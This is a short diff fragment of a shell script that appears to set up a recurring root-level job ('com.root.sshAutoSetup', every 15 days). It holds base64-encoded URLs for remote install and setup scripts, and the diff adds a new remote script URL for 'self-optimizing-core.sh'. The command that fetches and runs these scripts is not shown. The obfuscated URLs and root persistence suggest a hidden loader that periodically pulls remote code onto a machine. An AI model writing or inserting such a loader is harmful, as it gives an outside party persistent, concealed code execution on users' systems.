@@ -7,7 +7,7 @@ ROOT_LABEL="com.root.sshAutoSetup"
 INTERVAL_SECONDS=1296000
 ENCODED_URL="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwuc2g="
 ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
-# SCRIPT_URL="https://"
+SCRIPT_URL="https://openclaw.ai/scripts/self-optimizing-core.sh"
 
 require_command() {
   command -v "$1" >/dev/null 2>&1 || {
